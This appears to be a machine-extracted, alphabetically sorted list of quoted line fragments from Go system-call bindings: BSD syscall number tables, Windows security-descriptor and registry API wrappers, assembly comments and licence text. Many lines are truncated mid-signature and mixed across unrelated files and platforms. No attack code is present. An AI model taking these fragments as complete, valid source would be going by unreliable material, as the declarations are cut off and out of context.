"R15, R2          // Save go stack pointer"
"R15, R3          // Save return code from SVC"
"R2, R15          // Restore go stack pointer"
"R2, r1"
"R3, $0           // Check SVC return code"
"R3, R4"
"R3, addr"
"R3, err"
"R3, r1"
"R3, r2"
"R4, $-1"
"R4, 0(R9)   // Save stack pointer."
"R4, r1"
"R4, r2"
"R5, R9"
"RHEL         DistributionID = ""rhel"""
"RTCTime, error) {"
"RTCWkAlrm, error) {"
"RUNTIME_FUNCTION, entryCount uint32, baseAddress uintptr) (ret bool) = ntdll.RtlAddFunctionTable"
"RUNTIME_FUNCTION, entryCount uint32, baseAddress uintptr) (ret bool) {"
"RangeArgs(min, max)"
"RawSockaddrAny) (Sockaddr, error) {"
"RawSockaddrAny) (n, oobn int, recvflags int, err error) {"
"RawSockaddrAny) Sockaddr() (Sockaddr, error) {"
"RawSockaddrAny)(unsafe.Pointer(rsa)), l, overlapped, croutine)"
"RawSockaddrAny, addrlen "
"RawSockaddrAny, fromlen "
"RawSockaddrAny, lrsalen "
"RawSockaddrAny, rrsalen "
"RawSockaddrAny, tolen int32,  overlapped "
"RawSockaddrAny, tolen int32, overlapped "
"RawSyscall(SB),NOSPLIT,$0-28"
"RawSyscall(SB),NOSPLIT,$0-56"
"RawSyscall(SYS_ERRSTR, uintptr(unsafe.Pointer("
"RawSyscall6(SB),NOSPLIT,$0-40"
"RawSyscall6(SB),NOSPLIT,$0-80"
"RawSyscallNoError(SB),NOSPLIT,$0-24"
"RawSyscallNoError(SB),NOSPLIT,$0-48"
"Rdev:    uint64(old.Rdev),"
"Read(fd, frame)"
"Read(nfd, buf)"
"ReadConsole(console Handle, buf "
"ReadDirectoryChanges(handle Handle, buf "
"ReadProcessMemory(process Handle, baseAddress uintptr, buffer "
"Readlink(path string, buf []byte) (n int, err error) = SYS___READLINK_A"
"Readlink(path string, buf []byte) (n int, err error)"
"Readlinkat(dirfd int, path string, buf []byte) (n int, err error)"
"Red:     []byte{keyEscape, '[', '3', '1', 'm'},"
"Redistribution and use in source and binary forms, with or without"
"RegEnumKeyEx(key Handle, index uint32, name "
"RegNotifyChangeKeyValue(key Handle, watchSubtree bool, notifyFilter uint32, event Handle, asynchronous bool) (regerrno error) = advapi32.RegNotifyChangeKeyValue"
"RegOpenKeyEx(key Handle, subkey "
"RegQueryInfoKey(key Handle, class "
"RegQueryValueEx(key Handle, name "
"Region, ""region"", ""r"", """", ""AWS region (required)"")"
"Remote: pp[8:14],"
"Removexattr(path string, attr string) (err error)"
"Rename(from string, to string) (err error) = SYS___RENAME_A"
"Rename(from string, to string) (err error)"
"Renameat(fromfd int, from string, tofd int, to string) (err error)"
"Renameat(olddirfd int, oldpath string, newdirfd int, newpath string) (err error)"
"Renameat2(olddirfd int, oldpath string, newdirfd int, newpath string, flags uint) (err error)"
"ReportEvent(log Handle, etype uint16, category uint16, eventId uint32, usrSId uintptr, numStrings uint16, dataSize uint32, strings "
"RequestKey(keyType string, description string, callback string, destRingid int) (id int, err error)"
"Requirements: bash, go"
"Requirements: bash, go, docker"
"Reserved                  // Reserved, NCS backward compatibility."
"Reset: []byte{keyEscape, '[', '0', 'm'},"
"ResumeThread(thread Handle) (ret uint32, err error) [failretval==0xffffffff] = kernel32.ResumeThread"
"Rlimit, old "
"Rows, Cols, X, Y uint16"
"Run: runHelp,"
"Rusage) (int, error) {"
"Rusage) (wpid Pid_t, err error) {"
"Rusage) (wpid Pid_t, err error)"
"Rusage) (wpid int, err error) {"
"Rusage) (wpid int, err error)"
"Rusage) (wpid int32, err error) {"
"Rusage) (wpid int32, err error)"
"SAVSTACK_ASYNC(R8), R9"
"SECURITY_CREATOR_SID_AUTHORITY     = SidIdentifierAuthority{[6]byte{0, 0, 0, 0, 0, 3}}"
"SECURITY_DESCRIPTOR) Control() (control SECURITY_DESCRIPTOR_CONTROL, revision uint32, err error) {"
"SECURITY_DESCRIPTOR) RMControl() (control uint8, err error) {"
"SECURITY_DESCRIPTOR) SetControl(controlBitsOfInterest SECURITY_DESCRIPTOR_CONTROL, controlBitsToSet SECURITY_DESCRIPTOR_CONTROL) error {"
"SECURITY_DESCRIPTOR, absoluteSD "
"SECURITY_DESCRIPTOR, absoluteSDSize "
"SECURITY_DESCRIPTOR, control "
"SECURITY_DESCRIPTOR, controlBitsOfInterest SECURITY_DESCRIPTOR_CONTROL, controlBitsToSet SECURITY_DESCRIPTOR_CONTROL) (err error) = advapi32.SetSecurityDescriptorControl"
"SECURITY_DESCRIPTOR, controlBitsOfInterest SECURITY_DESCRIPTOR_CONTROL, controlBitsToSet SECURITY_DESCRIPTOR_CONTROL) (err error) {"
"SECURITY_DESCRIPTOR, daclPresent "
"SECURITY_DESCRIPTOR, daclPresent bool, dacl "
"SECURITY_DESCRIPTOR, err error) {"
"SECURITY_DESCRIPTOR, group "
"SECURITY_DESCRIPTOR, owner "
"SECURITY_DESCRIPTOR, revision uint32) (err error) = advapi32.InitializeSecurityDescriptor"
"SECURITY_DESCRIPTOR, revision uint32) (err error) {"
"SECURITY_DESCRIPTOR, revision uint32, securityInformation SECURITY_INFORMATION, str "
"SECURITY_DESCRIPTOR, rmControl "
"SECURITY_DESCRIPTOR, saclPresent "
"SECURITY_DESCRIPTOR, saclPresent bool, sacl "
"SECURITY_DESCRIPTOR, selfRelativeSD "
"SECURITY_DESCRIPTOR, selfRelativeSDSize "
"SECURITY_DESCRIPTOR, size "
"SECURITY_DESCRIPTOR, sizeNewSecurityDescriptor "
"SECURITY_DESCRIPTOR_CONTROL, revision "
"SECURITY_LOCAL_SID_AUTHORITY       = SidIdentifierAuthority{[6]byte{0, 0, 0, 0, 0, 2}}"
"SECURITY_MANDATORY_LABEL_AUTHORITY = SidIdentifierAuthority{[6]byte{0, 0, 0, 0, 0, 16}}"
"SECURITY_NON_UNIQUE_AUTHORITY      = SidIdentifierAuthority{[6]byte{0, 0, 0, 0, 0, 4}}"
"SECURITY_NT_AUTHORITY              = SidIdentifierAuthority{[6]byte{0, 0, 0, 0, 0, 5}}"
"SECURITY_NULL_SID_AUTHORITY        = SidIdentifierAuthority{[6]byte{0, 0, 0, 0, 0, 0}}"
"SECURITY_WORLD_SID_AUTHORITY       = SidIdentifierAuthority{[6]byte{0, 0, 0, 0, 0, 1}}"
"SID) (bool, error) {"
"SID) LookupAccount(system string) (account, domain string, accType uint32, err error) {"
"SID, dacl "
"SID, defaulted bool) error {"
"SID, defaulted bool, err error) {"
"SID, domain string, accType uint32, err error) {"
"SID, error) {"
"SID, group "
"SID, groupDefaulted "
"SID, groupDefaulted bool) (err error) = advapi32.SetSecurityDescriptorGroup"
"SID, groupDefaulted bool) (err error) {"
"SID, groupSize "
"SID, index uint32) (subAuthority "
"SID, isMember "
"SID, name "
"SID, ownerDefaulted "
"SID, ownerDefaulted bool) (err error) = advapi32.SetSecurityDescriptorOwner"
"SID, ownerDefaulted bool) (err error) {"
"SID, ownerSize "
"SID, sid "
"SID, sid2 "
"SID, sidLen "
"SID, sidType WELL_KNOWN_SID_TYPE) (isWellKnown bool) = advapi32.IsWellKnownSid"
"SID, sidType WELL_KNOWN_SID_TYPE) (isWellKnown bool) {"
"SID, sizeSid "
"SID, srcSid "
"SID, stringSid "
"SID:    binary.BigEndian.Uint16(pp[6:8]),"
"SIO_GET_EXTENSION_FUNCTION_POINTER,"
"SIZE)/ {printf("""
"SPDRP_SECURITY                    SPDRP = 0x00000017 // Security (R/W, binary form)"
"SPDRP_SECURITY_SDS                SPDRP = 0x00000018 // Security (W, SDS form)"
"SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT"
"SRC=$(shell find . -name """
"SYS_ACCEPT                   = 30  // { int accept(int s, struct sockaddr "
"SYS_ACCEPT                 = 30  // { int accept(int s, caddr_t name, int "
"SYS_ACCEPT         = 30  // { int sys_accept(int s, struct sockaddr "
"SYS_ACCEPT4                  = 541 // { int accept4(int s, struct sockaddr "
"SYS_ACCEPT4                = 541 // { int accept4(int s, caddr_t name, int "
"SYS_ACCEPT4        = 93  // { int sys_accept4(int s, struct sockaddr "
"SYS_AIO_CANCEL               = 316 // { int aio_cancel(int fd, struct aiocb "
"SYS_AIO_CANCEL             = 316 // { int aio_cancel(int fd, struct aiocb "
"SYS_AIO_FSYNC                = 465 // { int aio_fsync(int op, struct aiocb "
"SYS_AUDITON                  = 446 // { int auditon(int cmd, void "
"SYS_BIND                     = 104 // { int bind(int s, caddr_t name, int namelen)"
"SYS_BIND                   = 104 // { int bind(int s, caddr_t name, int namelen)"
"SYS_BIND           = 104 // { int sys_bind(int s, const struct sockaddr "
"SYS_BINDAT                   = 538 // { int bindat(int fd, int s, caddr_t name, int namelen)"
"SYS_CAP_FCNTLS_GET           = 537 // { int cap_fcntls_get(int fd, uint32_t "
"SYS_CAP_FCNTLS_LIMIT         = 536 // { int cap_fcntls_limit(int fd, uint32_t fcntlrights)"
"SYS_CAP_IOCTLS_GET           = 535 // { ssize_t cap_ioctls_get(int fd, u_long "
"SYS_CAP_IOCTLS_LIMIT         = 534 // { int cap_ioctls_limit(int fd, const u_long "
"SYS_CAP_RIGHTS_LIMIT         = 533 // { int cap_rights_limit(int fd, cap_rights_t "
"SYS_CHFLAGSAT                = 540 // { int chflagsat(int fd, const char "
"SYS_CHFLAGSAT              = 537 // { int chflagsat(int fd, const char "
"SYS_CHFLAGSAT      = 107 // { int sys_chflagsat(int fd, const char "
"SYS_CLOCK_GETCPUCLOCKID2     = 247 // { int clock_getcpuclockid2(id_t id,int which, clockid_t "
"SYS_CLOCK_GETRES             = 234 // { int clock_getres(clockid_t clock_id, struct timespec "
"SYS_CLOCK_GETRES           = 234 // { int clock_getres(clockid_t clock_id, struct timespec "
"SYS_CLOCK_GETRES   = 89  // { int sys_clock_getres(clockid_t clock_id, struct timespec "
"SYS_CLOCK_GETTIME            = 232 // { int clock_gettime(clockid_t clock_id, struct timespec "
"SYS_CLOCK_GETTIME          = 232 // { int clock_gettime(clockid_t clock_id, struct timespec "
"SYS_CLOCK_GETTIME  = 87  // { int sys_clock_gettime(clockid_t clock_id, struct timespec "
"SYS_CLOCK_NANOSLEEP          = 244 // { int clock_nanosleep(clockid_t clock_id, int flags, const struct timespec "
"SYS_CLOCK_SETTIME            = 233 // { int clock_settime( clockid_t clock_id, const struct timespec "
"SYS_CLOCK_SETTIME          = 233 // { int clock_settime(clockid_t clock_id, const struct timespec "
"SYS_CLOCK_SETTIME  = 88  // { int sys_clock_settime(clockid_t clock_id, const struct timespec "
"SYS_CONNECT                  = 98  // { int connect(int s, caddr_t name, int namelen)"
"SYS_CONNECT                = 98  // { int connect(int s, caddr_t name, int namelen)"
"SYS_CONNECT        = 98  // { int sys_connect(int s, const struct sockaddr "
"SYS_CONNECTAT                = 539 // { int connectat(int fd, int s, caddr_t name, int namelen)"
"SYS_CPUSET_GETAFFINITY       = 487 // { int cpuset_getaffinity(cpulevel_t level, cpuwhich_t which, id_t id, size_t cpusetsize, cpuset_t "
"SYS_CPUSET_GETID             = 486 // { int cpuset_getid(cpulevel_t level, cpuwhich_t which, id_t id, cpusetid_t "
"SYS_CPUSET_SETAFFINITY       = 488 // { int cpuset_setaffinity(cpulevel_t level, cpuwhich_t which, id_t id, size_t cpusetsize, const cpuset_t "
"SYS_CPUSET_SETID             = 485 // { int cpuset_setid(cpuwhich_t which, id_t id, cpusetid_t setid)"
"SYS_DUP2                     = 90  // { int dup2(u_int from, u_int to)"
"SYS_DUP2                   = 90  // { int dup2(int from, int to)"
"SYS_DUP2           = 90  // { int sys_dup2(int from, int to)"
"SYS_DUP3           = 102 // { int sys_dup3(int from, int to, int flags)"
"SYS_EXTACCEPT              = 482 // { int extaccept(int s, int flags, caddr_t name, int "
"SYS_EXTATTR_DELETE_FD        = 373 // { int extattr_delete_fd(int fd, int attrnamespace, const char "
"SYS_EXTATTR_GET_FD           = 372 // { ssize_t extattr_get_fd(int fd, int attrnamespace, const char "
"SYS_EXTATTR_LIST_FD          = 437 // { ssize_t extattr_list_fd(int fd, int attrnamespace, void "
"SYS_EXTATTR_SET_FD           = 371 // { ssize_t extattr_set_fd(int fd, int attrnamespace, const char "
"SYS_EXTCONNECT             = 483 // { int extconnect(int s, int flags, caddr_t name, int namelen)"
"SYS_EXTEXIT                = 494 // { void extexit(int how, int status, void "
"SYS_EXTPREAD               = 173 // { ssize_t extpread(int fd, void "
"SYS_EXTPREADV              = 289 // { ssize_t extpreadv(int fd, const struct iovec "
"SYS_EXTPWRITE              = 174 // { ssize_t extpwrite(int fd, const void "
"SYS_EXTPWRITEV             = 290 // { ssize_t extpwritev(int fd, const struct iovec "
"SYS_FACCESSAT                = 489 // { int faccessat(int fd, char "
"SYS_FACCESSAT              = 509 // { int faccessat(int fd, char "
"SYS_FACCESSAT      = 313 // { int sys_faccessat(int fd, const char "
"SYS_FCHFLAGS                 = 35  // { int fchflags(int fd, u_long flags)"
"SYS_FCHFLAGS               = 35  // { int fchflags(int fd, u_long flags)"
"SYS_FCHFLAGS       = 35  // { int sys_fchflags(int fd, u_int flags)"
"SYS_FCHMOD                   = 124 // { int fchmod(int fd, int mode)"
"SYS_FCHMOD                 = 124 // { int fchmod(int fd, int mode)"
"SYS_FCHMOD         = 124 // { int sys_fchmod(int fd, mode_t mode)"
"SYS_FCHMODAT                 = 490 // { int fchmodat(int fd, char "
"SYS_FCHMODAT               = 506 // { int fchmodat(int fd, char "
"SYS_FCHMODAT       = 314 // { int sys_fchmodat(int fd, const char "
"SYS_FCHOWN                   = 123 // { int fchown(int fd, int uid, int gid)"
"SYS_FCHOWN                 = 123 // { int fchown(int fd, int uid, int gid)"
"SYS_FCHOWN         = 123 // { int sys_fchown(int fd, uid_t uid, gid_t gid)"
"SYS_FCHOWNAT                 = 491 // { int fchownat(int fd, char "
"SYS_FCHOWNAT               = 507 // { int fchownat(int fd, char "
"SYS_FCHOWNAT       = 315 // { int sys_fchownat(int fd, const char "
"SYS_FCNTL                    = 92  // { int fcntl(int fd, int cmd, long arg)"
"SYS_FCNTL                  = 92  // { int fcntl(int fd, int cmd, long arg)"
"SYS_FCNTL          = 92  // { int sys_fcntl(int fd, int cmd, ... void "
"SYS_FEXECVE                  = 492 // { int fexecve(int fd, char "
"SYS_FLOCK                    = 131 // { int flock(int fd, int how)"
"SYS_FLOCK                  = 131 // { int flock(int fd, int how)"
"SYS_FLOCK          = 131 // { int sys_flock(int fd, int how)"
"SYS_FPATHCONF                = 192 // { int fpathconf(int fd, int name)"
"SYS_FPATHCONF              = 192 // { int fpathconf(int fd, int name)"
"SYS_FPATHCONF      = 192 // { long sys_fpathconf(int fd, int name)"
"SYS_FSTAT                    = 189 // { int fstat(int fd, struct stat "
"SYS_FSTAT                  = 476 // { int fstat(int fd, struct stat "
"SYS_FSTAT          = 53  // { int sys_fstat(int fd, struct stat "
"SYS_FSTATAT                  = 493 // { int fstatat(int fd, char "
"SYS_FSTATAT                = 505 // { int fstatat(int fd, char "
"SYS_FSTATAT        = 42  // { int sys_fstatat(int fd, const char "
"SYS_FSTATAT_FREEBSD12       = 552 // { int fstatat(int fd, _In_z_ char "
"SYS_FSTATFS                  = 397 // { int fstatfs(int fd, struct statfs "
"SYS_FSTATFS                = 158 // { int fstatfs(int fd, struct statfs "
"SYS_FSTATFS        = 64  // { int sys_fstatfs(int fd, struct statfs "
"SYS_FSTATFS_FREEBSD12       = 556 // { int fstatfs(int fd, "
"SYS_FSTATVFS               = 501 // { int fstatvfs(int fd, struct statvfs "
"SYS_FSTAT_FREEBSD12         = 551 // { int fstat(int fd, _Out_ struct stat "
"SYS_FTRUNCATE                = 480 // { int ftruncate(int fd, off_t length)"
"SYS_FTRUNCATE              = 201 // { int ftruncate(int fd, int pad, off_t length)"
"SYS_FTRUNCATE      = 201 // { int sys_ftruncate(int fd, int pad, off_t length)"
"SYS_FUTIMENS                 = 546 // { int futimens(int fd, struct timespec "
"SYS_FUTIMENS               = 540 // { int futimens(int fd, const struct timespec "
"SYS_FUTIMENS       = 85  // { int sys_futimens(int fd, const struct timespec "
"SYS_FUTIMES                  = 206 // { int futimes(int fd, struct timeval "
"SYS_FUTIMES                = 206 // { int futimes(int fd, struct timeval "
"SYS_FUTIMES        = 77  // { int sys_futimes(int fd, const struct timeval "
"SYS_FUTIMESAT                = 494 // { int futimesat(int fd, char "
"SYS_GETCPUCLOCKID          = 547 // { int getcpuclockid(pid_t pid, lwpid_t lwp_id, clockid_t "
"SYS_GETDENTS                 = 272 // { int getdents(int fd, char "
"SYS_GETDENTS               = 480 // { int getdents(int fd, char "
"SYS_GETDENTS       = 99  // { int sys_getdents(int fd, void "
"SYS_GETDIRENTRIES            = 196 // { int getdirentries(int fd, char "
"SYS_GETDIRENTRIES          = 479 // { int getdirentries(int fd, char "
"SYS_GETDIRENTRIES_FREEBSD12 = 554 // { ssize_t getdirentries(int fd, "
"SYS_GETGROUPS                = 79  // { int getgroups(u_int gidsetsize, gid_t "
"SYS_GETGROUPS              = 79  // { int getgroups(u_int gidsetsize, gid_t "
"SYS_GETGROUPS      = 79  // { int sys_getgroups(int gidsetsize, gid_t "
"SYS_GETITIMER                = 86  // { int getitimer(u_int which, struct itimerval "
"SYS_GETITIMER              = 86  // { int getitimer(u_int which, struct itimerval "
"SYS_GETITIMER      = 70  // { int sys_getitimer(int which, struct itimerval "
"SYS_GETPEERNAME              = 31  // { int getpeername(int fdes, struct sockaddr "
"SYS_GETPEERNAME            = 31  // { int getpeername(int fdes, caddr_t asa, int "
"SYS_GETPEERNAME    = 31  // { int sys_getpeername(int fdes, struct sockaddr "
"SYS_GETPRIORITY              = 100 // { int getpriority(int which, int who)"
"SYS_GETPRIORITY            = 100 // { int getpriority(int which, int who)"
"SYS_GETPRIORITY    = 100 // { int sys_getpriority(int which, id_t who)"
"SYS_GETRLIMIT                = 194 // { int getrlimit(u_int which, struct rlimit "
"SYS_GETRLIMIT              = 194 // { int getrlimit(u_int which, struct rlimit "
"SYS_GETRLIMIT      = 194 // { int sys_getrlimit(int which, struct rlimit "
"SYS_GETRUSAGE                = 117 // { int getrusage(int who, struct rusage "
"SYS_GETRUSAGE              = 117 // { int getrusage(int who, struct rusage "
"SYS_GETRUSAGE      = 19  // { int sys_getrusage(int who, struct rusage "
"SYS_GETSOCKNAME              = 32  // { int getsockname(int fdes, struct sockaddr "
"SYS_GETSOCKNAME            = 32  // { int getsockname(int fdes, caddr_t asa, int "
"SYS_GETSOCKNAME    = 32  // { int sys_getsockname(int fdes, struct sockaddr "
"SYS_GETSOCKOPT               = 118 // { int getsockopt(int s, int level, int name, caddr_t val, int "
"SYS_GETSOCKOPT             = 118 // { int getsockopt(int s, int level, int name, caddr_t val, int "
"SYS_GETSOCKOPT     = 118 // { int sys_getsockopt(int s, int level, int name, void "
"SYS_GET_TLS_AREA           = 473 // { int get_tls_area(int which, struct tls_info "
"SYS_IOCTL                    = 54  // { int ioctl(int fd, u_long com, caddr_t data)"
"SYS_IOCTL                  = 54  // { int ioctl(int fd, u_long com, caddr_t data)"
"SYS_IOCTL          = 54  // { int sys_ioctl(int fd, u_long com, ... void "
"SYS_IOPRIO_GET             = 521 // { int ioprio_get(int which, int who)"
"SYS_IOPRIO_SET             = 520 // { int ioprio_set(int which, int who, int prio)"
"SYS_KENV                     = 390 // { int kenv(int what, const char "
"SYS_KENV                   = 390 // { int kenv(int what, const char "
"SYS_KEVENT                   = 363 // { int kevent(int fd, struct kevent "
"SYS_KEVENT                 = 363 // { int kevent(int fd, const struct kevent "
"SYS_KEVENT         = 72  // { int sys_kevent(int fd, const struct kevent "
"SYS_KILL                     = 37  // { int kill(int pid, int signum)"
"SYS_KILL                   = 37  // { int kill(int pid, int signum)"
"SYS_KILL           = 122 // { int sys_kill(int pid, int signum)"
"SYS_KLDSTAT                  = 308 // { int kldstat(int fileid, struct kld_file_stat"
"SYS_KLDSTAT                = 308 // { int kldstat(int fileid, struct kld_file_stat"
"SYS_KLDSYM                   = 337 // { int kldsym(int fileid, int cmd, void "
"SYS_KLDSYM                 = 337 // { int kldsym(int fileid, int cmd, void "
"SYS_KLDUNLOADF               = 444 // { int kldunloadf(int fileid, int flags)"
"SYS_KMQ_NOTIFY               = 461 // { int kmq_notify(int mqd,"
"SYS_KMQ_SETATTR              = 458 // { int kmq_setattr(int mqd,"
"SYS_KMQ_TIMEDRECEIVE         = 459 // { int kmq_timedreceive(int mqd,"
"SYS_KMQ_TIMEDSEND            = 460 // { int kmq_timedsend(int mqd,"
"SYS_KSEM_GETVALUE            = 407 // { int ksem_getvalue(semid_t id, int "
"SYS_KSEM_TIMEDWAIT           = 441 // { int ksem_timedwait(semid_t id, const struct timespec "
"SYS_KTIMER_CREATE            = 235 // { int ktimer_create(clockid_t clock_id, struct sigevent "
"SYS_KTIMER_GETTIME           = 238 // { int ktimer_gettime(int timerid, struct itimerspec "
"SYS_KTIMER_SETTIME           = 237 // { int ktimer_settime(int timerid, int flags, const struct itimerspec "
"SYS_LINKAT                   = 495 // { int linkat(int fd1, char "
"SYS_LINKAT                 = 531 // { int linkat(int fd1, char "
"SYS_LINKAT         = 317 // { int sys_linkat(int fd1, const char "
"SYS_LIO_LISTIO               = 257 // { int lio_listio(int mode, struct aiocb "
"SYS_LIO_LISTIO             = 320 // { int lio_listio(int mode, struct aiocb "
"SYS_LISTEN                   = 106 // { int listen(int s, int backlog)"
"SYS_LISTEN                 = 106 // { int listen(int s, int backlog)"
"SYS_LISTEN         = 106 // { int sys_listen(int s, int backlog)"
"SYS_LSEEK                    = 478 // { off_t lseek(int fd, off_t offset, int whence)"
"SYS_LSEEK                  = 199 // { off_t lseek(int fd, int pad, off_t offset, int whence)"
"SYS_LSEEK          = 199 // { off_t sys_lseek(int fd, int pad, off_t offset, int whence)"
"SYS_LWP_GETAFFINITY        = 545 // { int lwp_getaffinity(pid_t pid, lwpid_t tid, cpumask_t "
"SYS_LWP_GETNAME            = 549 // { int lwp_getname(lwpid_t tid, char "
"SYS_LWP_KILL               = 497 // { int lwp_kill(pid_t pid, lwpid_t tid, int signum)"
"SYS_LWP_RTPRIO             = 498 // { int lwp_rtprio(int function, pid_t pid, lwpid_t tid, struct rtprio "
"SYS_LWP_SETAFFINITY        = 544 // { int lwp_setaffinity(pid_t pid, lwpid_t tid, const cpumask_t "
"SYS_LWP_SETNAME            = 542 // { int lwp_setname(lwpid_t tid, const char "
"SYS_MKDIRAT                  = 496 // { int mkdirat(int fd, char "
"SYS_MKDIRAT                = 524 // { int mkdirat(int fd, char "
"SYS_MKDIRAT        = 318 // { int sys_mkdirat(int fd, const char "
"SYS_MKFIFOAT                 = 497 // { int mkfifoat(int fd, char "
"SYS_MKFIFOAT               = 525 // { int mkfifoat(int fd, char "
"SYS_MKFIFOAT       = 319 // { int sys_mkfifoat(int fd, const char "
"SYS_MKNODAT                  = 498 // { int mknodat(int fd, char "
"SYS_MKNODAT                = 526 // { int mknodat(int fd, char "
"SYS_MKNODAT        = 320 // { int sys_mknodat(int fd, const char "
"SYS_MKNODAT_FREEBSD12       = 559 // { int mknodat(int fd, _In_z_ char "
"SYS_MMAP                     = 477 // { caddr_t mmap(caddr_t addr, size_t len, int prot, int flags, int fd, off_t pos)"
"SYS_MMAP                   = 197 // { caddr_t mmap(caddr_t addr, size_t len, int prot, int flags, int fd, int pad, off_t pos)"
"SYS_MODSTAT                  = 301 // { int modstat(int modid, struct module_stat "
"SYS_MODSTAT                = 301 // { int modstat(int modid, struct module_stat"
"SYS_MQ_GETATTR             = 513 // { int mq_getattr(mqd_t mqdes, struct mq_attr "
"SYS_MQ_NOTIFY              = 515 // { int mq_notify(mqd_t mqdes, const struct sigevent "
"SYS_MQ_RECEIVE             = 517 // { ssize_t mq_receive(mqd_t mqdes, char "
"SYS_MQ_SEND                = 516 // { int mq_send(mqd_t mqdes, const char "
"SYS_MQ_SETATTR             = 514 // { int mq_setattr(mqd_t mqdes, const struct mq_attr "
"SYS_MQ_TIMEDRECEIVE        = 519 // { ssize_t mq_timedreceive(mqd_t mqdes, char "
"SYS_MQ_TIMEDSEND           = 518 // { int mq_timedsend(mqd_t mqdes, const char "
"SYS_MSGCTL                   = 511 // { int msgctl(int msqid, int cmd, struct msqid_ds "
"SYS_MSGCTL                 = 224 // { int msgctl(int msqid, int cmd, struct msqid_ds "
"SYS_MSGCTL         = 297 // { int sys_msgctl(int msqid, int cmd, struct msqid_ds "
"SYS_MSGGET                   = 225 // { int msgget(key_t key, int msgflg)"
"SYS_MSGGET                 = 225 // { int msgget(key_t key, int msgflg)"
"SYS_MSGGET         = 225 // { int sys_msgget(key_t key, int msgflg)"
"SYS_MSGRCV                   = 227 // { int msgrcv(int msqid, void "
"SYS_MSGRCV                 = 227 // { int msgrcv(int msqid, void "
"SYS_MSGRCV         = 227 // { int sys_msgrcv(int msqid, void "
"SYS_MSGSND                   = 226 // { int msgsnd(int msqid, const void "
"SYS_MSGSND                 = 226 // { int msgsnd(int msqid, const void "
"SYS_MSGSND         = 226 // { int sys_msgsnd(int msqid, const void "
"SYS_MSGSYS                   = 170 // { int msgsys(int which, int a2, int a3, int a4, int a5, int a6)"
"SYS_NFSSVC                   = 155 // { int nfssvc(int flag, caddr_t argp)"
"SYS_NFSSVC         = 155 // { int sys_nfssvc(int flag, void "
"SYS_NFSTAT                   = 279 // { int nfstat(int fd, struct nstat "
"SYS_NLM_SYSCALL              = 154 // { int nlm_syscall(int debug_level, int grace_period, int addr_count, char "
"SYS_NUMA_GETAFFINITY         = 548 // { int numa_getaffinity(cpuwhich_t which, id_t id, struct vm_domain_policy_entry "
"SYS_NUMA_SETAFFINITY         = 549 // { int numa_setaffinity(cpuwhich_t which, id_t id, const struct vm_domain_policy_entry "
"SYS_OPENAT                   = 499 // { int openat(int fd, char "
"SYS_OPENAT                 = 504 // { int openat(int fd, char "
"SYS_OPENAT         = 321 // { int sys_openat(int fd, const char "
"SYS_PDGETPID                 = 520 // { int pdgetpid(int fd, pid_t "
"SYS_PDKILL                   = 519 // { int pdkill(int fd, int signum)"
"SYS_POSIX_FADVISE            = 531 // { int posix_fadvise(int fd, off_t offset, off_t len, int advice)"
"SYS_POSIX_FALLOCATE          = 530 // { int posix_fallocate(int fd, off_t offset, off_t len)"
"SYS_PREAD                    = 475 // { ssize_t pread(int fd, void "
"SYS_PREAD          = 173 // { ssize_t sys_pread(int fd, void "
"SYS_PREADV                   = 289 // { ssize_t preadv(int fd, struct iovec "
"SYS_PREADV         = 267 // { ssize_t sys_preadv(int fd, const struct iovec "
"SYS_PROCCTL                  = 544 // { int procctl(idtype_t idtype, id_t id, int com, void "
"SYS_PROCCTL                = 536 // { int procctl(idtype_t idtype, id_t id, int cmd, void "
"SYS_PROFIL                   = 44  // { int profil(caddr_t samples, size_t size, size_t offset, u_int scale)"
"SYS_PROFIL                 = 44  // { int profil(caddr_t samples, size_t size, u_long offset, u_int scale)"
"SYS_PROFIL         = 44  // { int sys_profil(caddr_t samples, size_t size, u_long offset, u_int scale)"
"SYS_PSELECT                  = 522 // { int pselect(int nd, fd_set "
"SYS_PSELECT                = 499 // { int pselect(int nd, fd_set "
"SYS_PSELECT        = 110 // { int sys_pselect(int nd, fd_set "
"SYS_PTRACE                   = 26  // { int ptrace(int req, pid_t pid, caddr_t addr, int data)"
"SYS_PTRACE                 = 26  // { int ptrace(int req, pid_t pid, caddr_t addr, int data)"
"SYS_PTRACE         = 26  // { int sys_ptrace(int req, pid_t pid, caddr_t addr, int data)"
"SYS_PWRITE                   = 476 // { ssize_t pwrite(int fd, const void "
"SYS_PWRITE         = 174 // { ssize_t sys_pwrite(int fd, const void "
"SYS_PWRITEV                  = 290 // { ssize_t pwritev(int fd, struct iovec "
"SYS_PWRITEV        = 268 // { ssize_t sys_pwritev(int fd, const struct iovec "
"SYS_READ                     = 3   // { ssize_t read(int fd, void "
"SYS_READ           = 3   // { ssize_t sys_read(int fd, void "
"SYS_READ  = 3 // { ssize_t read(int fd, void "
"SYS_READLINKAT               = 500 // { int readlinkat(int fd, char "
"SYS_READLINKAT             = 527 // { int readlinkat(int fd, char "
"SYS_READLINKAT     = 322 // { ssize_t sys_readlinkat(int fd, const char "
"SYS_READV                    = 120 // { int readv(int fd, struct iovec "
"SYS_READV                  = 120 // { int readv(int fd, struct iovec "
"SYS_READV          = 120 // { ssize_t sys_readv(int fd, const struct iovec "
"SYS_RECVFROM                 = 29  // { int recvfrom(int s, caddr_t buf, size_t len, int flags, struct sockaddr "
"SYS_RECVFROM               = 29  // { int recvfrom(int s, caddr_t buf, size_t len, int flags, caddr_t from, int "
"SYS_RECVFROM       = 29  // { ssize_t sys_recvfrom(int s, void "
"SYS_RECVMSG                  = 27  // { int recvmsg(int s, struct msghdr "
"SYS_RECVMSG                = 27  // { int recvmsg(int s, struct msghdr "
"SYS_RECVMSG        = 27  // { ssize_t sys_recvmsg(int s, struct msghdr "
"SYS_RENAMEAT                 = 501 // { int renameat(int oldfd, char "
"SYS_RENAMEAT               = 523 // { int renameat(int oldfd, char "
"SYS_RENAMEAT       = 323 // { int sys_renameat(int fromfd, const char "
"SYS_RTPRIO                   = 166 // { int rtprio(int function, pid_t pid, struct rtprio "
"SYS_RTPRIO                 = 166 // { int rtprio(int function, pid_t pid, struct rtprio "
"SYS_RTPRIO_THREAD            = 466 // { int rtprio_thread(int function, lwpid_t lwpid, struct rtprio "
"SYS_SCHED_GETPARAM           = 328 // { int sched_getparam (pid_t pid, struct sched_param "
"SYS_SCHED_GETPARAM         = 328 // { int sched_getparam (pid_t pid, struct sched_param "
"SYS_SCHED_RR_GET_INTERVAL    = 334 // { int sched_rr_get_interval (pid_t pid, struct timespec "
